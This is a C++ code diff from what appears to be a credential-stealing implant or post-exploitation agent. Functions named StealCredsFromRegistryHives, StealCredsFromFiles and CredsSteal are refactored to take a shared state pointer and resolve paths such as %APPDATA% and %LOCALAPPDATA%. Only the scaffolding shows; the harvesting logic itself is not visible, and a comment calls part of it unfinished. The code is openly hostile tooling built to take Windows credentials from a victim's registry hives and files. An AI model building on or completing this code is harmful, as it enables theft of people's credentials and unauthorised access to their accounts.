@@ -2,8 +2,9 @@
 
  namespace Task::Helper::Creds
     {
-        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromRegistryHives(const std::wstring& wUserSID)
-        {
+        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromRegistryHives(
+            const std::wstring& wUserSID
+        ) {
             std::map<std::wstring, std::vector<std::wstring>> result;
 
             std::vector<std::wstring> wTargetHives = {
@@ -28,16 +29,17 @@
         }
 
         std::map<std::wstring, std::vector<std::wstring>> StealCredsFromFiles(
+            State::PSTATE pState,
             const std::wstring& wUserName,
             const std::wstring& wUserSID
         ) {
             std::map<std::wstring, std::vector<std::wstring>> result;
 
             // Get env paths.
-            std::wstring envAppData = System::Env::GetStrings(L"%APPDATA%");
-            std::wstring envLocalAppData = System::Env::GetStrings(L"%LOCALAPPDATA%");
-            std::wstring envSystemDrive = System::Env::GetStrings(L"%SYSTEMDRIVE%");
-            std::wstring envSystemRoot = System::Env::GetStrings(L"%SYSTEMROOT%");
+            std::wstring envAppData = System::Env::GetStrings(pState->pProcs, L"%APPDATA%");
+            std::wstring envLocalAppData = System::Env::GetStrings(pState->pProcs, L"%LOCALAPPDATA%");
+            std::wstring envSystemDrive = System::Env::GetStrings(pState->pProcs, L"%SYSTEMDRIVE%");
+            std::wstring envSystemRoot = System::Env::GetStrings(pState->pProcs, L"%SYSTEMROOT%");
 
             // Currently not working on this code.
 
@@ -113,7 +115,7 @@
 
 namespace Task
 {
-    std::wstring CredsSteal()
+    std::wstring CredsSteal(State::PSTATE pState)
     {
         std::wstring result = L"";
 
@@ -132,7 +134,11 @@ namespace Task
         }
 
         // std::map<std::wstring, std::vector<std::wstring>> wCredsFromRegistryHives = Task::Helper::Creds::StealCredsFromRegistryHives(wUserSID);
-        std::map<std::wstring, std::vector<std::wstring>> wCredsFromFiles = Task::Helper::Creds::StealCredsFromFiles(wUserName, wUserSID);
+        std::map<std::wstring, std::vector<std::wstring>> wCredsFromFiles = Task::Helper::Creds::StealCredsFromFiles(
+            pState,
+            wUserName,
+            wUserSID
+        );
 
         if (wCredsFromFiles.size() == 0)
         {
